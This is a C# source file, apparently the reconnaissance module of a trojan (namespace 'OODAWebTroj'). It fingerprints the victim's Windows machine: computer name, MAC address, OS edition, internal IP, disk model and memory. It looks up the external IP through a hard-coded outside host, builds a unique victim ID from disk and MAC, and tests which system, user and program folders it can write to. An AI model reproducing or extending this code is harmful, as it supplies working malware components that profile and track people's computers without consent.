using System;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Management;

namespace OODAWebTroj
{
    public class Observer
    {
        public struct SystemInfo
        {
            public string ComputerName
            {
                get
                {
                    var str = "";
                    var mc = new ManagementClass("Win32_ComputerSystem");
                    var moc = mc.GetInstances();
                    foreach (var o in moc)
                    {
                        var mo = (ManagementObject) o;
                        str = mo["Caption"].ToString();
                    }
                    return ReplKey(str);
                }
            }
            public string NetworkCardId
            {
                get
                {
                    var moAddress = " ";
                    using (var mc = new ManagementClass("Win32_NetworkAdapterConfiguration"))
                    {
                        var moc2 = mc.GetInstances();
                        foreach (var o in moc2)
                        {
                            var mo = (ManagementObject) o;
                            if ((bool) mo["IPEnabled"])
                                moAddress = mo["MacAddress"].ToString();
                            mo.Dispose();
                        }
                    }
                    return ReplKey(moAddress);
                }
            }
            public string OSname
            {
                get
                {
                    var str = "";
                    var mc = new ManagementClass("Win32_OperatingSystem");
                    var moc = mc.GetInstances();
                    foreach (var o in moc)
                    {
                        var mo = (ManagementObject) o;
                        str = mo["Caption"].ToString();
                    }
                    str = str.Replace("®", "").Replace("Microsoft ", "").Replace("Windows", "Win").Replace(" ", " ");
                    return Shrink(ReplKey(str));
                }
            }
            public string InnerIpAddr
            {
                get
                {
                    var str = "";
                    var mc = new ManagementClass("Win32_NetworkAdapterConfiguration");
                    var moc = mc.GetInstances();
                    foreach (var o in moc)
                    {
                        var mo = (ManagementObject) o;
                        if ((bool) mo["IPEnabled"])
                        {
                            //st=mo["IpAddress"].ToString(); 
                            Array ar;
                            ar = (Array) (mo.Properties["IpAddress"].Value);
                            str = ar.GetValue(0).ToString();
                            break;
                        }
                    }
                    return ReplKey(str);
                }
            }
            public string HardDiskId
            {
                get
                {
                    try
                    {
                        var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");
                        return ReplKey((from ManagementObject mo in searcher.Get() select mo["Model"].ToString().Trim()).FirstOrDefault());
                    }
                    catch
                    {
                        return "";
                    }
                }
            }
            public string OutterIpAddr
            {
                get
                {
                    var str = "";
                    for (var i = 0; i < 3; i++)
                    {
                        try
                        {
                            var wr = WebRequest.Create("http://cnbrony.com/ip.php");
                            var s = wr.GetResponse().GetResponseStream();
                            if (s != null)
                            {
                                var sr = new StreamReader(s, Encoding.Default);
                                str = sr.ReadToEnd(); //读取网站的数据
                                /*
                                              int start = all.IndexOf("您的IP地址是：[") + 9;
                                              int end = all.IndexOf("]", start);
                                              str = all.Substring(start, end - start);*/
                                sr.Close();
                            }
                            if (s != null) s.Close();
                            if ("" != str) break;
                        }
                        catch
                        {
                            // ignored
                        }
                    }
                    return ReplKey(str);
                }
            }
            public string PhysicalMemory
            {
                get
                {
                    double str = 0;
                    var mc = new ManagementClass("Win32_ComputerSystem");
                    var moc = mc.GetInstances();
                    foreach (var o in moc)
                    {
                        var mo = (ManagementObject) o;
                        str = double.Parse(s: mo["TotalPhysicalMemory"].ToString());
                    }
                    return ReplKey(Math.Round(str/1024/1024/1024, 1).ToString(CultureInfo.InvariantCulture));
                }
            }
            public string Guid => Crypt.Md5(HardDiskId + NetworkCardId);
            public static string ReplKey(string words)
            {
                return words.Replace("\"", " ").Replace("\'", " ").Replace(",", " ");
            }
            private static string Shrink(string str)
            {
                return str.Replace("旗舰版", "Ult").Replace("Ultimate", "Ult")
                    .Replace("企业版", "Ent").Replace("Enterprise", "Ent")
                    .Replace("家庭高级版", "HomeP").Replace("Home Professional", "HomeP")
                    .Replace("家庭普通版", "HomeB").Replace("Home Basic", "HomeB")
                    .Replace("专业版", "Pro").Replace("Professional", "Pro");
            }

        }

        public class Writable
        {
            public bool Writeable => System || User || Program;
            public bool System => WriteTest(41);
            public bool User => WriteTest(26);
            public bool Program => WriteTest(38);
            private static bool WriteTest(int virable)
            {
                try
                {
                    File.Create(Environment.GetFolderPath((Environment.SpecialFolder) virable) + "/testlol").Close();
                    File.Delete(Environment.GetFolderPath((Environment.SpecialFolder) virable) + "/testlol");
                    return true;
                }
                catch
                {
                    return false;
                }
            }
        }
    }
}

